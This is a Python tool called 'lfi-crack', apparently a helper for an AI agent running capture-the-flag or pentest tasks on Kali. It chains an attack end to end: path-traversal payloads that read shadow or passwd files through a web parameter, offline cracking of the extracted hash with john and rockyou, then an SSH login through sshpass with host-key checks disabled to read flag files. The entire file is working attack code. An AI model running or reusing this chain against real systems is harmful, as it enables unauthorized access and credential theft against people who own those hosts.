#!/usr/bin/env python3
"""Deterministic LFI/path-traversal -> offline-crack -> SSH closer (`lfi-crack`).

A classic real-world chain the model drives inconsistently: read a world-readable password-hash backup
through a path-traversal/LFI param, crack it offline (john + rockyou), then SSH in as that user and
read the loot. This does the whole chain deterministically and self-contained (curl + john + rockyou +
sshpass, all on the Kali runner):

  lfi-crack --url http://t/download --param file --target t

Steps: spray traversal payloads for the common hash-backup locations -> parse the user:hash ->
john --wordlist=rockyou -> SSH (sshpass) as that user -> read the flag/loot. Pure: hash parsing +
traversal payload builder; the curl/john/ssh calls are I/O."""
import argparse
import os
import re
import subprocess
import sys

# world-readable places a unix password hash leaks from (no breadcrumb needed)
_HASH_FILES = ["var/backups/shadow.bak", "var/backups/passwd.bak", "etc/shadow",
               "var/backups/shadow", "etc/passwd"]
# a crackable hash: $1$ md5, $5$ sha256, $6$ sha512, $y$ yescrypt, $2[aby]$ bcrypt.
# NOT anchored to line start — the hash often arrives wrapped (e.g. inside an HTML <pre>devops:$6$...).
_SHADOW_RE = re.compile(
    r"([a-z_][a-z0-9_-]*):(\$(?:1|5|6|y|2[aby])\$[^\s:]+)")
_FLAG_READ = "id; cat ~/flag.txt 2>/dev/null; cat /root/flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null"


def parse_cred_hash(text):
    """First (user, hash) with a real crackable hash from passwd/shadow content, or None. Locked
    (*/!) and empty password fields are skipped. Pure."""
    m = _SHADOW_RE.search(text or "")
    return (m.group(1), m.group(2)) if m else None


def traversal_payloads(targetfile: str) -> list:
    """`../`-prefixed payloads at increasing depth for `targetfile` (leading slashes stripped). Pure."""
    tf = (targetfile or "").lstrip("/")
    out, seen = [], set()
    for depth in range(3, 13):
        p = ("../" * depth) + tf
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


# --- I/O ---

def _curl(url: str, param: str, value: str, timeout: float = 12.0) -> str:
    sep = "&" if "?" in url else "?"
    full = f"{url}{sep}{param}=" + __import__("urllib.parse", fromlist=["quote"]).quote(value, safe="")
    try:
        r = subprocess.run(["curl", "-s", "-g", "--max-time", "10", full],
                           capture_output=True, text=True, timeout=timeout)
        return r.stdout or ""
    except Exception:  # noqa: BLE001
        return ""


def run(url: str, param: str, target: str) -> str:
    # 1) disclose a hash via traversal
    cred = None
    for hf in _HASH_FILES:
        for payload in traversal_payloads(hf):
            body = _curl(url, param, payload)
            cred = parse_cred_hash(body)
            if cred:
                break
        if cred:
            break
    if not cred:
        return "[lfi-crack: no readable password-hash backup found via traversal]"
    user, h = cred

    # 2) crack offline with john + rockyou
    os.makedirs("/tmp/loot", exist_ok=True)
    hp = "/tmp/loot/lfi.hash"
    with open(hp, "w") as f:
        f.write(f"{user}:{h}\n")
    wl = "/usr/share/wordlists/rockyou.txt"
    try:
        subprocess.run(["john", f"--wordlist={wl}", hp], capture_output=True, text=True, timeout=900)
        show = subprocess.run(["john", "--show", hp], capture_output=True, text=True, timeout=60)
    except Exception as e:  # noqa: BLE001
        return f"[lfi-crack: john failed: {e}] (hash for {user} at {hp})"
    m = re.search(rf"^{re.escape(user)}:([^:]+):", show.stdout or "", re.M)
    if not m:
        return f"[lfi-crack: hash for {user} not cracked by rockyou] ({hp})"
    pw = m.group(1)

    # 3) SSH in and read the flag/loot
    ssh = (f"sshpass -p {pw!r} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
           f"-o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 {user}@{target} {_FLAG_READ!r}")
    try:
        r = subprocess.run(["sh", "-c", ssh], capture_output=True, text=True, timeout=40)
        out = (r.stdout or "") + (r.stderr or "")
    except Exception as e:  # noqa: BLE001
        out = f"(ssh error: {e})"
    return f"[lfi-crack] cracked {user}:{pw} -> SSH {user}@{target}\n{out}"


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="lfi-crack",
                                 description="LFI/traversal -> offline crack -> SSH")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", default="file")
    ap.add_argument("--target", required=True)
    a = ap.parse_args(argv)
    print(run(a.url, a.param, a.target))
    return 0


if __name__ == "__main__":
    sys.exit(main())
